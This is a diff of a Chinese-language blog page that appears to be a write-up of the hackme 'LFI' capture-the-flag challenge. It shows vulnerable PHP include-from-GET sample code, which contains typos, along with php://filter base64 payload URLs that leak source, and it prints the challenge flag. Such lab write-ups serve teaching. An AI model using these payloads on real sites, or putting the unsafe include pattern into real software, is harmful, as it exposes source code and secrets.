@@ -88,7 +88,7 @@
 <meta property="og:description" content="[src = hackme] LFI题目描述What this admin’s password? That is not important at all, just get the flag.Tips: LFI, php://filter">
 <meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="http://yoursite.com/2019/09/30/LFI/lfi1.PNG">
-<meta property="og:updated_time" content="2019-09-30T08:21:55.729Z">
+<meta property="og:updated_time" content="2019-11-15T06:15:27.966Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="LFI">
 <meta name="twitter:description" content="[src = hackme] LFI题目描述What this admin’s password? That is not important at all, just get the flag.Tips: LFI, php://filter">
@@ -359,12 +359,21 @@
 <h2 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h2><p>点击题目，跳转到题目页面。网页的URL为：<a href="https://hackme.inndy.tw/lfi/?page=pages/index" target="_blank" rel="noopener">https://hackme.inndy.tw/lfi/?page=pages/index</a></p>
 <p>点击Introduction时，URL变为：<a href="https://hackme.inndy.tw/lfi/?page=pages/intro" target="_blank" rel="noopener">https://hackme.inndy.tw/lfi/?page=pages/intro</a></p>
 <p>点击Login时，URL变为：<a href="https://hackme.inndy.tw/lfi/?page=pages/login" target="_blank" rel="noopener">https://hackme.inndy.tw/lfi/?page=pages/login</a></p>
-<p>可以看到参数page为文件包含。题目提示不要管admin和密码，所以猜测是不是有一个flag的文件，可以包含进来。尝试<br><a href="https://hackme.inndy.tw/lfi/?page=pages/flag" target="_blank" rel="noopener">https://hackme.inndy.tw/lfi/?page=pages/flag</a><br>显示下面的页面：<br><img src="./lfi1.PNG" alt="lfi"><br>页面提示“Can you read the flag?”。再看题目的第二个提示，php://filter，因为LFI只能读取到非php文件的源码，所以对PHP文件只能解析执行，所以要看到PHP文件的源码，需要通过通过php://filter/read=convert.base64-encode/resource= 利用LFI来查看源码。构造下面的URL：<br><a href="https://hackme.inndy.tw/lfi/?page=php://filter/read=convert.base64-encode/resource=pages/flag" target="_blank" rel="noopener">https://hackme.inndy.tw/lfi/?page=php://filter/read=convert.base64-encode/resource=pages/flag</a><br>得到一串Base64解码得到</p>
+<p>可以看到参数page为文件包含,题目对提示也是本地文件包含（LFI，Local file inclusion），还有一种是远程文件包含（RFI、Remote file inclusion）。php中常见的文件包含函数有以下四种：<br>include()<br>require()<br>include_once()<br>require()_once()</p>
+<p>当利用这四个函数来包含文件时，不管文件是什么类型（图片、txt等等），都会直接作为php文件进行解析。<br>示例代码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $file=$__GET[<span class="string">'page'</span>];</span><br><span class="line">    <span class="keyword">include</span> $file;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
+
+<p>或者通过后天添加后缀对方式：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $file=$__GET[<span class="string">'page'</span>].<span class="string">"php"</span>;</span><br><span class="line">    <span class="keyword">include</span> $file;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
+
+<p>题目提示不要管admin和密码，所以猜测是不是有一个flag的文件，可以包含进来。尝试<br><a href="https://hackme.inndy.tw/lfi/?page=pages/flag" target="_blank" rel="noopener">https://hackme.inndy.tw/lfi/?page=pages/flag</a><br>显示下面的页面：<br><img src="./lfi1.PNG" alt="lfi"><br>页面提示“Can you read the flag?”。</p>
+<p>再看题目的第二个提示，php://filter，因为LFI只能读取到非php文件的源码，所以对PHP文件只能解析执行，所以要看到PHP文件的源码，需要通过通过php伪协议php://filter/read=convert.base64-encode/resource= 利用LFI来查看源码。构造下面的URL：<br><a href="https://hackme.inndy.tw/lfi/?page=php://filter/read=convert.base64-encode/resource=pages/flag" target="_blank" rel="noopener">https://hackme.inndy.tw/lfi/?page=php://filter/read=convert.base64-encode/resource=pages/flag</a><br>得到一串Base64解码得到</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Can you read the flag<span class="meta">&lt;?php</span> <span class="keyword">require</span>(<span class="string">'config.php'</span>); <span class="meta">?&gt;</span>?</span><br></pre></td></tr></table></figure>
 
 <p>再尝试同样的方式读取config.php（<a href="https://hackme.inndy.tw/lfi/?page=php://filter/read=convert.base64-encode/resource=pages/config）" target="_blank" rel="noopener">https://hackme.inndy.tw/lfi/?page=php://filter/read=convert.base64-encode/resource=pages/config）</a>.得到的base64解码得到flag：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$flag = <span class="string">"FLAG&#123;Yoooooo_LFI_g00d_2cXxsXSYP9EVLrIo&#125;"</span>;</span><br></pre></td></tr></table></figure>
 
+<p>补充：php其他对伪协议<br>php://input:可以读取没有处理过的POST数据,不依赖于特定的php.ini指令。当enctype=”multipart/form-data” 的时候 php://input 是无效的。</p>
 <h2 id="知识点"><a href="#知识点" class="headerlink" title="[知识点]"></a>[知识点]</h2><p>本地文件包含是一个重要的Web漏洞，结合php://filter/可以泄露源码。</p>
 
       
